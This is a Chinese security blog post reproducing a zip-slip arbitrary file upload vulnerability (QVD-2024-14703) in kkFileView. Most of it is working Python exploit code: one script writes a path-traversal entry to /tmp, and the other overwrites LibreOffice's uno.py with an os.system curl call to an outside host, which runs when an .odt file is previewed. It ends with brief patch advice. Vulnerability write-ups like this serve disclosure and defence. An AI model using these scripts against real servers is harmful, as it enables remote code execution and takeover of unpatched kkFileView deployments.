#  【漏洞复现】kkFileView任意文件上传漏洞（QVD-2024-14703）   
紫色皓月  皓月的笔记本   2024-05-04 20:00  
  
声明：请勿将文章内的相关技术用于非法目的，如有相关非法行为与文章作者和本公众号无关。  
  
0X01   
简介  
  
kkFileView为文件文档在线预览解决方案，该项目使用流行的spring boot搭建，易上手和部署，基本支持主流办公文档的在线预览，如doc,docx,xls,xlsx,ppt,pptx,pdf,txt,zip,rar,图片,视频,音频等等  
  
  
文章参考：  
  
[【搭建合集】kkFileView 4.3.0搭建](http://mp.weixin.qq.com/s?__biz=Mzk0ODM0NDExMg==&mid=2247484475&idx=1&sn=62d59f62324e355a7d6e89c1a678c5b2&chksm=c3684064f41fc972235ad2379627039e5a021d34090c0c42dfa3b9869e5d3fe9e065f99e60d2&scene=21#wechat_redirect)  
  
  
  
漏洞编号：  
  
QVD-2024-14703  
  
  
影响范围：  
  
4.2.0 <= kkFileView <= 4.4.0-beta  
  
  
复现环境：  
  
kkFileView 4.3.0  
  
  
0X02   
漏洞复现  
```
import zipfile

if __name__ == "__main__":
    try:
        binary1 = b'test'
        binary2 = b'test'
        zipFile = zipfile.ZipFile("test.zip", "a", zipfile.ZIP_DEFLATED)
        info = zipfile.ZipInfo("test.zip")
        zipFile.writestr("test", binary1)
        zipFile.writestr("../../../../../../../../../../../../../../../../../../../tmp/flag", binary2)
        zipFile.close()
    except IOError as e:
        raise e
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/4axEiaIyhaPI38xChTosq6pibN1QK8af9y0ASe3efI509t04UPZOcSGsm05dTz3XGNibIToKIdlicWkAqwjfua99rw/640?wx_fmt=jpeg&from=appmsg "")  
  
执行py生成压缩包，将压缩包上传。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/4axEiaIyhaPI38xChTosq6pibN1QK8af9y7e6hvOpBjmELQAAEJEZIczWgmxv4veq3DSZwcNWf2dN7qkiaKRswrAg/640?wx_fmt=jpeg&from=appmsg "")  
  
点击预览  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/4axEiaIyhaPI38xChTosq6pibN1QK8af9yrRKmJVaRjbeicImTL6XYuzmfBPZhYic8o02pk4TJtGxxXQIZ2Ea70Pcw/640?wx_fmt=jpeg&from=appmsg "")  
  
文件写入成功  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/4axEiaIyhaPI38xChTosq6pibN1QK8af9yicAfuhBjIMA1Zg2cI7DIwic8Ur88fz61fSYk7VYoG1WyEutUwHU6PyVg/640?wx_fmt=jpeg&from=appmsg "")  
  
  
命令执行  
  
注：在linux系统复现成功  
```
import zipfile

if __name__ == "__main__":
    try:
        binary1 = b'test'
        binary2 = b'import os\r\nos.system(\'curl http://192.168.20.131:9999/123123\')'
        zipFile = zipfile.ZipFile("test2.zip", "a", zipfile.ZIP_DEFLATED)
        info = zipfile.ZipInfo("test2.zip")
        zipFile.writestr("test", binary1)
        zipFile.writestr("../../../../../../../../../../../../../../../../../../../opt/libreoffice7.5/program/uno.py", binary2)
        zipFile.close()
    except IOError as e:
        raise e

注：uno.py路径需结合目标服务器的路径更改。
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/4axEiaIyhaPI38xChTosq6pibN1QK8af9yzoqtRGQG0arele4Fjv3VTtVRibtIXrDr2Fob2iaMAexp6LkUSBAwABVg/640?wx_fmt=jpeg&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/4axEiaIyhaPI38xChTosq6pibN1QK8af9yRKkJXobiboxysZwjogvXhCCEAKbibhLCiaAYLF0stPQ2SibIiarzMXCXy6w/640?wx_fmt=jpeg&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/4axEiaIyhaPI38xChTosq6pibN1QK8af9ysnwEfXia1TC2lmmty9EG1EJrztpywI9Ew782iahygqZDpVtOSHtcic5lw/640?wx_fmt=jpeg&from=appmsg "")  
  
再上传一个.odt后缀的文件  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/4axEiaIyhaPI38xChTosq6pibN1QK8af9yiaMgJPDtqgVY0kiaz0nddhicdDwH8ZaRatVIu1vnUE5v62WUOBQ3JOGWg/640?wx_fmt=jpeg&from=appmsg "")  
  
点击预览执行命令  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/4axEiaIyhaPI38xChTosq6pibN1QK8af9ybKCj1ugfLPfhTia2sRKsiblztIV5mXBHzpwQqH5zlxFgJyr2n7uNj7ZQ/640?wx_fmt=jpeg&from=appmsg "")  
  
在使用odt转pdf时会调用系统的Libreoffice，而此进程会调用库中的uno.py文件，因此可以在该py文件添加内容。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/4axEiaIyhaPI38xChTosq6pibN1QK8af9yWbzFAHCWlyEs0VKntIenJcqoBupYx8BKDY5cNZsfZRHCoicJwdiaHiapQ/640?wx_fmt=jpeg&from=appmsg "")  
  
  
0X03 修复建议  
  
升级至安全版本及其以上！  
  
临  
时  
解决方案：  
开启  
file.upload.disable=true  
参数，禁用首页的上传文件，关闭演示入口  
  
  
0X04 写在最后  
  
回复“加群”，获取群号。  
  
侵删！  
  
  
